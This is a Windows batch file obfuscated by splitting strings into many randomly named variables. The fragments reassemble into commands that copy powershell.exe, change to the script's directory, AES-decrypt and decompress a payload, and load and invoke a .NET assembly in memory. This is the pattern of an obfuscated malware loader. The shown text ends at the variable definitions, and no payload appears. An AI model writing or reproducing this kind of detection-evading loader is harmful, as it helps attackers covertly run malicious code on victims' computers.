@echo off
set "cCOOnMpMyZ=py"
set "GwVwGqXywR=do"
set "eAktsMSEpZ=in"
set "BRssGZBeGL=0\"
set "UNmOYmNpnp=Sy"
set "UMoOZxGHxP=po"
set "DGKjLXUQsm=\v"
set "wQkGstVEjS=he"
set "JEUegXRpgM=32"
set "jodLtTnveX=xe"
set "fksipNvQsC=1."
set "erRjNEnuJx=he"
set "KExbkQIANg=ws"
set "fmZggPmcPD=we"
set "VssKQyyBWm=y "
set "mciBMitBLt=Po"
set "BnTiOfMBta=co"
set "kqhYuXeYOq=s\"
set "EXJMuvTGwJ=Wi"
set "XvMcLxFqVv=ll"
set "VNLjMNtIxn= C"
set "LddfZZxMKP=ow"
set "RztUQnwvAQ= /"
set "XhVHyYGruQ=em"
set "lhyvUsMEjT=\W"
set "JxcwrNdDNX=we"
set "vohrizdjjC=rS"
set "pOpPONCJva=nd"
set "hOsCSdPVaT=ll"
set "VYrIJfOVUn=.e"
set "bOYtTLnsDM=rs"
set "bdfcdxBZEA=:\"
set "VSDDPBTENv=st"
set "VZKlHgkUTT=cd"
set "hUeQqGLAbt= %~dp0"
set "YuBDBdsUJM=ress"
set "GLBGGcPDUa=OyzA"
set "FHaYmvXvmA=x = "
set "TffkSujJhS=;$YH"
set "qdYaskcrcS=O.Me"
set "PLRLKFbimQ=lit("
set "IQlVSxuwcq=yste"
set "vaKzprSLAL=in $"
set "SkfoFIHnAh=pose"
set "DzGVLMoTaA=oArr"
set "usdTejFaUP=sF ="
set "bTwcUNHqJd=YHuK"
set "FjocdHPyyv='')("
set "jQetwaemnf=pStr"
set "orzYJNHhCA=$sLz"
set "BoqDbzHfVJ=ss -"
set "aIxWxukJXR=.IO."
set "OgliPLwRmg=lBlo"
set "jUogQkDoAG=Y.Su"
set "tmYHBPNcHe=raph"
set "OxPsedFdSC=PKCS"
set "zyTpwqKxBy=xeeq"
set "CFMiOBXxWP=m.Re"
set "KYuOJZBqWG=oint"
set "eRapQjKRnh=V = "
set "LNrjYEgFMj=uKv "
set "QQFXUZGqpp=QyGL"
set "tpsdlAfpPD=736u"
set "jczRCzTPNp=pDZz"
set "TFbbxjqGUc= '')"
set "DoinRscCvJ=[]] "
set "ESckvHpuPq=GL.I"
set "fFWGzAKaAb=em.I"
set "SxVSYmwxnT=pher"
set "txmfilFQRX===')"
set "JdhERMYMHc=('l0"
set "CUQETFxknI=;$vN"
set "KuGBCwUAdH=ycNx"
set "bmQklMIdpb=QyGL"
set "HmojvXMYup=se()"
set "hZQLavXNhO=stem"
set "CnrwciPLni=nirt"
set "AMSiojZKcg=QyGL"
set "TXatjIVGYK=ct S"
set "pQgstVzsdI=Comp"
set "rvVIKYuQnG=Bmor"
set "CnPNYiWzep=$vNt"
set "CQdgaomKhY=v.En"
set "eLBNAqFmml=le  "
set "jtUlfWRJLb=, (,"
set "XfmRpdvYfN=ptog"
set "fPHldUfTml=n ''"
set "NoaQYdUZiG=ateD"
set "uGYWVGrJax=ose("
set "btwjnQqawU= New"
set "rueGkZtBDz=ose("
set "fwWGsHzFiw=]::("
set "wAdoGjmlUK=tryP"
set "tqwwOBEHQO=]::("
set "iGDqLCHlWl=:: '"
set "NPmkOabXOl=-joi"
set "TjgFnwoLTT=brea"
set "gECRNVckQa=ionM"
set "wKPfhQwktl=j) {"
set "DjaPmhDAEx=join"
set "pvFHzFpTBa=);$t"
set "TxKgazbvYz=3HWs"
set "XChXiUKELS=3); "
set "ZYPCVzreAI=tem."
set "vBNRvtWlnY=em.C"
set "aKNqcbIKUx=Obje"
set "ratGoUYchY=gMod"
set "hyflUTlaCk=.Key"
set "LpCkunrMbe=stem"
set "xwBwfrTPwF=S46e"
set "rAlTFoixFj=New-"
set "JEaTWIWCME=..-1"
set "mCYnGAQhwK=OOJ."
set "NVVCvAuZHl=qycN"
